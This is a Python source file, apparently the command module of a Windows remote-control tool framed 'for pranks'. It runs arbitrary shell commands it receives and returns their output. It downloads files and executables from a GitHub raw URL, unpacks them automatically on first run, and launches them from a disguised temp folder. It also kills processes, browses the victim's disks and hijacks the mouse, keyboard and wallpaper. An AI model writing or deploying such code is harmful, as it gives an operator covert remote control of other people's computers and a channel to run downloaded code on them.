import subprocess
import os
import time
import shutil
import ctypes
from re import findall, MULTILINE
import autoit
from urllib.request import urlretrieve

current_path = ''
infoA = False
cursor = [(0, 0), 0, 0]
cursor_down = [0, 0]
check_init = True
load_prefix = 'https://raw.githubusercontent.com/'
load_exe = 'aantr/win-host/main/executable.zip'
load_images = 'aantr/win-host/main/images.zip'


def command(s, reply=False):
    p = subprocess.Popen(s, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    if reply:
        msg = p.stdout.read()
        return msg


def to_exe(s):  # Add .exe to string
    return (s + '.exe') if s[-4:] != '.exe' else s


def temp(p, folder):  # Create new path to file, but copy it to %temp% dir
    suffix = ''
    if os.path.isfile(p):
        suffix = os.path.split(p)[1]
        p = os.path.split(p)[0]
    new_path = os.path.join(os.environ['temp'], folder, os.path.split(p)[1])
    copytree_update(p, new_path)
    if suffix != '':
        new_path = os.path.join(new_path, suffix)
    time.sleep(1)
    return new_path


def get_disks():  # Return available disks on windows
    return findall(r'[A-Z]+:.*$', os.popen('mountvol /').read(), MULTILINE)


def copytree_update(src, dst, updateAll=False):  # Advanced version of copy function
    if updateAll:
        shutil.rmtree(dst)
    for item in os.listdir(src):
        s = os.path.join(src, item)
        d = os.path.join(dst, item)
        if os.path.exists(d):
            continue
        if os.path.isdir(s):
            shutil.copytree(s, d)
        else:
            if not os.path.exists(os.path.split(d)[0]):
                os.makedirs(os.path.split(d)[0])
            shutil.copy(s, d)


#  For pranks:
def set_wallpaper(p, iA=False):
    if iA:
        ctypes.windll.user32.SystemParametersInfoA(20, 0, os.path.abspath(p), 3)
    else:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(p), 3)


def sleep_cursor(time_secs):
    global cursor
    cursor[0] = autoit.mouse_get_pos()
    cursor[1] = time_secs


def write_notepad(text):
    command('notepad.exe')
    try:
        autoit.win_wait('[CLASS:Notepad]', timeout=3)
        autoit.win_activate('[CLASS:Notepad]')
    except autoit.autoit.AutoItError as e:
        print(e)
    for i in text.split('*'):
        autoit.send(i)
        autoit.send('{enter}')


def close_active_win():
    autoit.send('!{F4}')


def cmd(s: str, directory='', v=False):
    global current_path, infoA, cursor_down
    if v:
        return 7, 1

    if s[0] == '.':
        # ?
        variables = {'im': os.path.join(directory, 'images'),
                     'path': current_path}
        for k, v in variables:
            s = s.replace(f'?{k}', v)
        if s[:4] == '.exe':
            if len(s.split()) >= 2:
                work = os.path.join(directory, 'executable')
                name = to_exe(s.split()[1])
                folder = name[:-4]
                if os.path.exists(os.path.join(work, folder, name)):
                    s = temp(os.path.join(work, folder, name), 'z1MSImc4eBoAd')
                    command(s)
                    return b''
                return 'Unknown exe'.encode('cp866')
            return 'Wrong syntax'.encode('cp866')
        elif s[:4] == '.cls':
            if len(s.split()) >= 2:
                name = to_exe(s.split()[1])
                s = f'taskkill /f /im {name}'
                command(s)
                return b''
            return 'Wrong syntax'.encode('cp866')
        elif s[:10] == '.download ':
            p = s[10:s.rfind(' ')].strip()
            url = s[s.rfind(' '):].strip()
            if os.path.exists(p) or os.path.exists(p[:p.rfind('\\')]):
                urlretrieve(load_prefix + url, p)
                return b''
            return 'No such dir'.encode('cp866')
        elif s[:12] == '.downloadgd ':
            p = s[12:s.rfind(' ')].strip()
            url = s[s.rfind(' '):].strip()
            url = load_prefix + url
            return cmd('.download ' + p + ' ' + url)
        elif s[:3] == '.bg':
            if len(s.split()) >= 2:
                p = s.split()[1]
                if p == 'A':
                    infoA = not infoA
                    return str(infoA).encode('cp866')
                ims = os.listdir(variables['im'])
                if p in map(lambda j: j if '.' not in j else j[:j.rfind('.')], ims):
                    for i in ['.jpg', '.png', '.bmp']:
                        if p + i in ims:
                            p = p + i
                            break
                if os.path.exists(os.path.join(variables['im'], p)):
                    set_wallpaper(os.path.join(variables['im'], p), infoA)
                    return b''
                return 'No such im'.encode('cp866')
            else:
                return 'Wrong syntax'.encode('cp866')

        elif s[:3] == '.ls':
            if len(s.split()) >= 2:
                p = s[4:]
                if p == 'root':
                    current_path = ''
                elif p == '..' and len(os.path.split(current_path)) >= 1:
                    current_path = os.path.split(current_path)[0]
                elif os.path.isdir(os.path.join(current_path, p)):
                    current_path = os.path.join(current_path, p)
                else:
                    return 'No such dir'.encode('cp866')
            else:
                if current_path == '':
                    s = get_disks()
                    return '\n'.join(['\n'] + s).encode('cp866')
                return '\n'.join([current_path] + os.listdir(current_path)).encode('cp866')
            return b''
        elif s[:5] == '.curs':
            if len(s.split()) >= 2:
                t = s.split()[1]
                sleep_cursor(float(t))
                return b''
            return 'Wrong syntax'.encode('cp866')
        elif s[:5] == '.note':
            if len(s.split()) >= 2:
                t = s[6:]
                write_notepad(t)
                return b''
            return 'Wrong syntax'.encode('cp866')
        elif s[:3] == '.f4':
            if len(s.split()) >= 2:
                t = float(s.split()[1])
                time.sleep(t)
                close_active_win()
                return b''
            return 'Wrong syntax'.encode('cp866')
        elif s[:6] == '.write':
            if len(s.split()) >= 3:
                time_sleep = float(s.split()[1])
                time.sleep(time_sleep)
                t = ' '.join(s.split()[2:])
                autoit.send(t)
                return b''
            return 'Wrong syntax'.encode('cp866')
        elif s[:9] == '.movecurs':
            if len(s.split()) >= 3:
                time_sleep = float(s.split()[1])
                time.sleep(time_sleep)
                for i in s.split()[2:]:
                    x, y = autoit.mouse_get_pos()
                    i = i.split('.')
                    autoit.mouse_move(x + int(i[0]), y + int(i[1]), speed=-1)
                return b''
            return 'Wrong syntax'.encode('cp866')
        elif s[:9] == '.downcurs':
            if len(s.split()) >= 2:
                t = float(s.split()[1])
                cursor_down[0], cursor_down[1] = t, time.time()
                return b''
            return 'Wrong syntax'.encode('cp866')
        elif s.startswith('.print'):
            return s[s.find(' ')+1:].encode('cp866')

        return 'No such command'.encode('cp866')
    elif s[0] == '?':
        s = s[1:]
        msg = command(s, True)
        return msg
    command(s)
    return b''


def track(directory=''):
    delay = 0.1
    time.sleep(delay)
    global check_init
    if cursor[1] > 0:
        if cursor[2] == 0:
            cursor[2] = time.time()
        length_ = 10
        if abs(cursor[0][0] - autoit.mouse_get_pos()[0]) > length_ or \
                abs(cursor[0][1] - autoit.mouse_get_pos()[1]) > length_:
            autoit.mouse_move(*cursor[0], speed=0)
        if time.time() - cursor[2] > cursor[1]:
            cursor[1] = 0
            cursor[2] = 0
    elif cursor_down[0]:
        autoit.mouse_up()
        autoit.mouse_down()
        if time.time() - cursor_down[1] > cursor_down[0]:
            cursor_down[0] = 0
    elif check_init:
        check_init = False
        print('check init')
        check_folders = {'executable': load_exe,
                         'images': load_images}
        for k, v in check_folders.items():
            name, url = k, v
            print(f'check {name}')
            if not os.path.exists(os.path.join(directory, name)):
                path = os.path.join(directory, f'{name}.zip')
                urlretrieve(load_prefix + url, path)
                shutil.unpack_archive(os.path.join(directory, f'{name}.zip'), directory, 'zip')
                os.remove(os.path.join(directory, f'{name}.zip'))
        print('ok')
